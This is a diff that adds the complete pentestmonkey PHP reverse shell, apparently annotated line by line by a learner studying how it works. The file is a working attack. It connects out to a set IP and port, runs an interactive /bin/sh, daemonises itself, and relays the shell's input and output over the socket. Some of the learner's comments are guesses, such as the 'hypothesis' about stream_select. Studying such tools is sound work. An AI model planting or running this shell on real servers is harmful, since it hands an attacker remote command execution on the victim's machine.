@@ -1,0 +1,204 @@
+// ! comments are my own annotations
+
+
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);    // ! sets the time limit of the script. when 0, it means the script can run till completion
+$VERSION = "1.0"; 
+$ip = '127.0.0.1';  // CHANGE THIS     // ! ip to direct reverse shell
+$port = 1234;       // CHANGE THIS     // ! port to direct reverse shell on the ip
+$chunk_size = 1400;  // ! this is the data size to send to the server. it is set to 1400 bytes which is 100 bytes lower than the 1500 bytes MTU (maximum transmission unit) of ethernet
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i'; // ! actual command to get shell
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+
+// !  this attempts to daemonise itself so that the process will be put in the background and the process will fork to a child process. doing this allows the program to remain running even if the terminal is closed.
+
+if (function_exists('pcntl_fork')) { // ! if it was able to fork this executes
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1); // ! if it couldnt fork then the script exits
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits // ! and child process continues from here
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else { // ! if it didnt fork it prints this and continues on attempting a reverse shell connection
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+
+umask(0);   // ! sets script permissions to the max it can have. setting it to 0 means no bits are removed from the permissions. this uses the same octal notation of 0-7 for perms like chmod. a mask of 0 means no permissions removed. if a 2, 4, or 1 is present, it means that the write, read, or execute permissions respectively are removed. it follows the same order as owner, group, others
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30); // ! attempt to open a connection to the ip on the port
+if (!$sock) { // ! if couldnt, print the error
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array( // ! An indexed array where the key represents the descriptor number and the value represents how PHP will pass that descriptor to the child process. 0 is stdin, 1 is stdout, while 2 is stderr. 
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes); // ! execute command and open file pointers for i/o from descriptorspec
+
+if (!is_resource($process)) { // ! checks if the process is a resource. if it isnt, it couldnt spawn the shell
+        printit("ERROR: Can't spawn shell");
+        exit(1); // ! script exits
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+// ! want to unblock everything
+
+printit("Successfully opened reverse shell to $ip:$port"); // ! shell created
+
+while (1) { // ! while true essentially
+        // Check for end of TCP connection // ! more specifically it checks whether it has reached eof (end of file) on the file pointer of the socket connection.
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        // Check for end of STDOUT // ! if there is no more shell output, it says the shell terminated
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        
+        // ! hypothesis: it checks if the command is done and then switches to the write to get input from host to send to target. then if the command is still going it just keeps the stdout or stderr open
+        
+        $read_a = array($sock, $pipes[1], $pipes[2]); // ! read from these pipes, stdout and stderr
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // ! the write_a and error_a streams don't change. therefore it only checks to see if the first stream changes (stdout).
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) { // ! can we read the socket connection? if so, execute the following
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size); // ! read to the input variable from sock of chunk size 1400 bytes | this is data from hacker sent to target
+                if ($debug) printit("SOCK: $input"); 
+                fwrite($pipes[0], $input); // ! write the input to stdin
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) { // ! if stdout available in read_a (readable streams) execute the following
+                if ($debug) printit("STDOUT READ"); 
+                $input = fread($pipes[1], $chunk_size); // ! read to the input variable from stdout of chunk size 1400 bytes
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input); // ! write the input to socket since it's going back to us
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) { // ! same thing as above for stdout basically
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);   // ! close everything when done
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?> 
+
+
+
